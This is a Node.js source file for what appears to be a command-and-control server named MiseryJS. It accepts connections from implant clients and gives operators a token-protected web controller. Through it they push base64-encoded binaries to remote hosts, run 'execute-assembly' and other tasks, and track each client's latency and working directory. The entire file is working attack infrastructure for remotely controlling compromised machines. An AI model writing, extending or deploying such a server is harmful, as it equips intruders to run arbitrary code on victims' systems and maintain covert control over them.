console.log(require('figlet').textSync('MiseryJS')) 
const app = require('express')();
const teamApp = require('express')();
const listener = require('http').Server(app, {
  maxHttpBufferSize: 1e8
});
const team = require('http').Server(teamApp, {
  maxHttpBufferSize: 1e8
});
const controllers = require('socket.io')(team);
const clients = require('socket.io')(listener);
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');

teamApp.get('/controller', (req, res) => {
  res.sendFile(__dirname + '/misery-controller.html');
});

teamApp.get('/commands.json', (req, res) => {
  res.sendFile(__dirname + '/commands.json');
});

var id = uuidv4();

var customers = [];

var queuedTasks = [];

controllers.on('connection', (socket) => {
  if(socket.handshake.auth.token != id){
    socket.disconnect(true);
    return;
  }

  controllers.emit('connections', customers);

  socket.on('echo', msg => {
    var cust = customers.find(c => c.id == msg.id);
    if(cust){
      clients.to(cust.socketId).emit("echo", msg.message);
      //console.log(cust.socketId + ": " + msg.message);
    }
  });

  socket.on('exit', msg => {
    var cust = customers.find(c => c.id == msg.id);
    if(cust){
      clients.to(cust.socketId).emit("exit");
    }
  });

  socket.on('load', msg => {
    var cust = customers.find(c => c.id == msg.id);

    if(cust){
      if(fs.existsSync(`./${msg.fileName}`)){
        
        binary = fs.readFileSync(`./${msg.fileName}`).toString('base64');
        clients.to(cust.socketId).emit("load", binary);
        console.log("Loaded: " + msg.fileName);
      }else{
        socket.emit('echo', 'File does not exist');
      }
    }else{
      socket.emit('echo', 'Invalid client');
    }
  });

  socket.on("execute-assembly", msg => {
    var cust = customers.find(c => c.id == msg.id);
    var fileName = msg.args[0];
    if(cust){
      if(fs.existsSync(`./${fileName}`)){
        
        binary = fs.readFileSync(`./${fileName}`).toString('base64');
        queuedTasks.push({
          check: "Loaded " + fileName,
          cust: cust.socketId,
          args: msg.args
        })
        clients.to(cust.socketId).emit("load", binary);
        console.log("Loaded: " + fileName);
      }else{
        socket.emit('echo', 'File does not exist');
      }
    }else{
      socket.emit('echo', 'Invalid client');
    }
  });

  socket.on('run-task', msg => {
    var cust = customers.find(c => c.id == msg.id);

    if(cust){
      clients.to(cust.socketId).emit("run-task", msg.args);
      console.log("Ran: " + msg.args);
    }else{
      socket.emit('echo', 'Invalid client');
    }
  });
});

clients.on('connection', (socket) => {
  console.log("new connection: " + socket.id);

  let startTime;

  setInterval(() => {
    startTime = Date.now();
    socket.emit('ping');
  }, 30000);

  socket.on('pong', () => {
    latency = Date.now() - startTime;
    
    customers.find(c => c.socketId == socket.id).latency = latency + 'ms';
    controllers.emit('connections', customers);
  });

  socket.on('register', msg => {
    msg.socketId = socket.id;
    msg.latency = 'Unknown';
    customers.push(msg);
    controllers.emit('connections', customers);
  });

  socket.on('disconnect', function() {
    console.log(socket.id + " disconnected");
    customers = customers.filter(c => c.socketId != socket.id);
    controllers.emit('connections', customers);
  });

  socket.on('echo', msg => {

    if(msg.returnType == 3){
      customers.find(c => c.socketId == socket.id).pwd = msg.output;
      controllers.emit('connections', customers);
    }

    controllers.emit('echo', msg);
    var task = queuedTasks.find(t => msg == t.check && socket.id == t.cust);

    if(task){
      socket.emit("run-task", task.args);
      //console.log("Ran: " + msg.args);
      queuedTasks = queuedTasks.filter(t => t != task);
    }
  });

});

listener.listen(8888, () => {
  console.log(`Listener server running at http://localhost:${8888}/`);
});
team.listen(3000, () => {
  console.log(`Team server running at http://localhost:${3000}/controller`);
});

console.log("The super secret password is " + id);